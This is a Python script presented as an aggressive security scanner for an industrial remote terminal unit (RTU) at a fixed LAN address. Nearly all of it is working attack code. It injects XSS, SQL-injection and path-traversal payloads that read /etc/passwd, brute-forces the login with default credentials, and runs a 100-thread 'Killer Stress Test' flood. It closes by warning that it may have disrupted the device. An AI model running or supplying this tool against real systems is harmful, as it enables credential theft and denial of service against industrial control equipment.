#!/usr/bin/env python3
"""
$$$$$$$\ $$$$$$$$\ $$\   $$\        $$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\ $$\   $$\ $$$$$$$$\ $$$$$$$\  
$$  __$$\\__$$  __|$$ |  $$ |      $$  __$$\ $$  __$$\ $$  __$$\ $$$\  $$ |$$$\  $$ |$$  _____|$$  __$$\ 
$$ |  $$ |  $$ |   $$ |  $$ |      $$ /  \__|$$ /  \__|$$ /  $$ |$$$$\ $$ |$$$$\ $$ |$$ |      $$ |  $$ |
$$$$$$$  |  $$ |   $$ |  $$ |      \$$$$$$\  $$ |      $$$$$$$$ |$$ $$\$$ |$$ $$\$$ |$$$$$\    $$$$$$$  |
$$  __$$<   $$ |   $$ |  $$ |       \____$$\ $$ |      $$  __$$ |$$ \$$$$ |$$ \$$$$ |$$  __|   $$  __$$< 
$$ |  $$ |  $$ |   $$ |  $$ |      $$\   $$ |$$ |  $$\ $$ |  $$ |$$ |\$$$ |$$ |\$$$ |$$ |      $$ |  $$ |
$$ |  $$ |  $$ |   \$$$$$$  |      \$$$$$$  |\$$$$$$  |$$ |  $$ |$$ | \$$ |$$ | \$$ |$$$$$$$$\ $$ |  $$ |
\__|  \__|  \__|    \______/        \______/  \______/ \__|  \__|\__|  \__|\__|  \__|\________|\__|  \__|
                                                    a                                                     
RTU Ultimate Security Scanner - Aggressive Mode (Fixed)
"""

import requests
import concurrent.futures
import threading
import time
import random
from fpdf import FPDF
from datetime import datetime
from bs4 import BeautifulSoup

# Configuration
RTU_IP = "192.168.11.200"
RTU_ENDPOINTS = ["/login.html?t=44690", "/index.html?t=1748012674629", "/config", "/system", "/api"]
CREDENTIALS = [("admin", "admin"), ("root", "toor"), ("user", "123456")]
THREADS = 100  # Aggressive threading
TIMEOUT = 3
STRESS_DURATION = 60  # Exactly 60 seconds, no more
REPORT_FILE = f"RTU_Audit_Report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"

class RTUScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers = {
            "User-Agent": "RTU-Killer-Scanner/1.0",
            "Accept": "*/*"
        }
        self.findings = []
        self.pdf = FPDF()
        self.start_time = datetime.now()
        self.stop_event = threading.Event()
        self.stress_stats = {"requests": 0, "errors": 0}

    def add_finding(self, severity, title, description, proof=None):
        self.findings.append({
            "severity": severity,
            "title": title,
            "description": description,
            "proof": proof,
            "timestamp": datetime.now().strftime("%H:%M:%S")
        })
        print(f"[{severity}] {title}")

    def scan_endpoints(self):
        """Aggressive parallel scanning"""
        print("\n[!] Launching Aggressive Endpoint Scan")
        
        def check_endpoint(endpoint):
            url = f"http://{RTU_IP}{endpoint}"
            try:
                r = self.session.get(url, timeout=TIMEOUT)
                
                if r.status_code == 200:
                    if "password" in r.text.lower():
                        self.add_finding(
                            "CRITICAL", 
                            "Password Exposure", 
                            f"Found credentials at {url}",
                            r.text[:200] + "..."
                        )
                    
                    # Vulnerability checks
                    vuln_checks = {
                        "XSS": "<script>alert(1)</script>",
                        "SQLi": "' OR 1=1--",
                        "LFI": "../../../../etc/passwd"
                    }
                    
                    for vuln, payload in vuln_checks.items():
                        test_url = f"{url}?test={payload}"
                        try:
                            r_test = self.session.get(test_url, timeout=TIMEOUT)
                            if payload in r_test.text:
                                self.add_finding(
                                    "CRITICAL",
                                    f"Possible {vuln} Vulnerability",
                                    f"Payload reflected at {test_url}"
                                )
                        except:
                            pass
                
                if "login" in endpoint.lower():
                    self.bruteforce_login(url)
                    
            except Exception as e:
                self.add_finding(
                    "ERROR",
                    "Scan Error",
                    f"Failed to scan {url}: {str(e)}"
                )

        with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
            executor.map(check_endpoint, RTU_ENDPOINTS)

    def bruteforce_login(self, url):
        """Aggressive credential testing"""
        print(f"[!] Bruteforcing {url}")
        
        def try_login(cred):
            try:
                r = self.session.post(
                    url,
                    data={"username": cred[0], "password": cred[1]},
                    timeout=TIMEOUT
                )
                if "invalid" not in r.text.lower():
                    self.add_finding(
                        "CRITICAL",
                        "Successful Login",
                        f"Credentials worked: {cred[0]}/{cred[1]} at {url}",
                        r.text[:200] + "..."
                    )
            except:
                pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
            executor.map(try_login, CREDENTIALS)

    def stress_test(self):
        """Fixed stress test with guaranteed termination"""
        print(f"\n[!] Starting Killer Stress Test ({STRESS_DURATION}s)")
        self.stop_event.clear()
        self.stress_stats = {"requests": 0, "errors": 0}
        
        def attack():
            while not self.stop_event.is_set():
                try:
                    target = f"http://{RTU_IP}{random.choice(RTU_ENDPOINTS)}"
                    self.session.get(target, timeout=1)
                    self.stress_stats["requests"] += 1
                except:
                    self.stress_stats["errors"] += 1

        # Start threads
        threads = []
        for _ in range(THREADS):
            t = threading.Thread(target=attack)
            t.daemon = True  # Ensures threads die with main program
            t.start()
            threads.append(t)

        # Progress display
        start_time = time.time()
        while time.time() - start_time < STRESS_DURATION:
            elapsed = int(time.time() - start_time)
            print(
                f"\r[Stress Test] {elapsed}/{STRESS_DURATION}s | "
                f"Requests: {self.stress_stats['requests']} | "
                f"Errors: {self.stress_stats['errors']}",
                end="", flush=True
            )
            time.sleep(1)
        
        # Cleanup
        self.stop_event.set()
        for t in threads:
            t.join(timeout=1)  # Wait max 1 second per thread
        
        print()  # New line after progress
        self.add_finding(
            "WARNING",
            "Stress Test Results",
            f"{self.stress_stats['requests']} requests ({self.stress_stats['requests']/STRESS_DURATION:.1f}/sec) with {self.stress_stats['errors']} errors"
        )

    def generate_pdf(self):
        """Generate professional PDF report"""
        self.pdf = FPDF()
        self.pdf.add_page()
        
        # Header
        self.pdf.set_font('Arial', 'B', 16)
        self.pdf.cell(0, 10, 'RTU Security Audit Report', 0, 1, 'C')
        self.pdf.ln(10)
        
        # Metadata
        self.pdf.set_font('Arial', '', 12)
        self.pdf.cell(0, 10, f'Target: {RTU_IP}', 0, 1)
        self.pdf.cell(0, 10, f'Date: {self.start_time.strftime("%Y-%m-%d %H:%M:%S")}', 0, 1)
        self.pdf.cell(0, 10, f'Duration: {(datetime.now() - self.start_time).total_seconds():.1f} seconds', 0, 1)
        self.pdf.ln(15)
        
        # Summary
        self.pdf.set_font('Arial', 'B', 14)
        self.pdf.cell(0, 10, 'Executive Summary', 0, 1)
        self.pdf.set_font('Arial', '', 12)
        
        crit_count = sum(1 for f in self.findings if f["severity"] == "CRITICAL")
        warn_count = sum(1 for f in self.findings if f["severity"] == "WARNING")
        
        self.pdf.multi_cell(0, 10, 
            f"This aggressive security audit identified {len(self.findings)} issues:\n"
            f"- Critical: {crit_count}\n"
            f"- Warnings: {warn_count}\n\n"
            "See detailed findings below.")
        self.pdf.ln(10)
        
        # Findings
        self.pdf.set_font('Arial', 'B', 14)
        self.pdf.cell(0, 10, 'Detailed Findings', 0, 1)
        
        for finding in sorted(self.findings, key=lambda x: x["severity"], reverse=True):
            self.pdf.set_font('Arial', 'B', 12)
            self.pdf.set_fill_color(255, 200, 200 if finding["severity"] == "CRITICAL" else 255)
            self.pdf.cell(0, 10, 
                f"{finding['severity']} - {finding['title']} ({finding['timestamp']})", 
                0, 1, 'L', True)
            
            self.pdf.set_font('Arial', '', 10)
            self.pdf.multi_cell(0, 8, finding["description"])
            
            if finding.get("proof"):
                self.pdf.set_font('Arial', 'I', 8)
                self.pdf.multi_cell(0, 6, f"Proof: {finding['proof']}")
            
            self.pdf.ln(5)
        
        # Footer
        self.pdf.set_y(-15)
        self.pdf.set_font('Arial', 'I', 8)
        self.pdf.cell(0, 10, f'Generated by RTU Killer Scanner at {datetime.now().strftime("%H:%M:%S")}', 0, 0, 'C')
        
        self.pdf.output(REPORT_FILE)
        print(f"\n[+] PDF report generated: {REPORT_FILE}")

if __name__ == "__main__":
    print("""
$$$$$$$\ $$$$$$$$\ $$\   $$\        $$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\ $$\   $$\ $$$$$$$$\ $$$$$$$\  
$$  __$$\\__$$  __|$$ |  $$ |      $$  __$$\ $$  __$$\ $$  __$$\ $$$\  $$ |$$$\  $$ |$$  _____|$$  __$$\ 
$$ |  $$ |  $$ |   $$ |  $$ |      $$ /  \__|$$ /  \__|$$ /  $$ |$$$$\ $$ |$$$$\ $$ |$$ |      $$ |  $$ |
$$$$$$$  |  $$ |   $$ |  $$ |      \$$$$$$\  $$ |      $$$$$$$$ |$$ $$\$$ |$$ $$\$$ |$$$$$\    $$$$$$$  |
$$  __$$<   $$ |   $$ |  $$ |       \____$$\ $$ |      $$  __$$ |$$ \$$$$ |$$ \$$$$ |$$  __|   $$  __$$< 
$$ |  $$ |  $$ |   $$ |  $$ |      $$\   $$ |$$ |  $$\ $$ |  $$ |$$ |\$$$ |$$ |\$$$ |$$ |      $$ |  $$ |
$$ |  $$ |  $$ |   \$$$$$$  |      \$$$$$$  |\$$$$$$  |$$ |  $$ |$$ | \$$ |$$ | \$$ |$$$$$$$$\ $$ |  $$ |
\__|  \__|  \__|    \______/        \______/  \______/ \__|  \__|\__|  \__|\__|  \__|\________|\__|  \__|
                                                    a                                                     
                                                                                                         
                                                                                                        
RTU Ultimate Security Scanner - Aggressive Mode (Fixed)
""")
    
    scanner = RTUScanner()
    
    try:
        scanner.scan_endpoints()
        scanner.stress_test()  # Now properly timed
        
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        scanner.stop_event.set()  # Ensure stress test stops
    
    finally:
        scanner.generate_pdf()
        print("\n[!] WARNING: This scan may have disrupted the RTU operation")
        print("[!] Review the findings and secure your system immediately")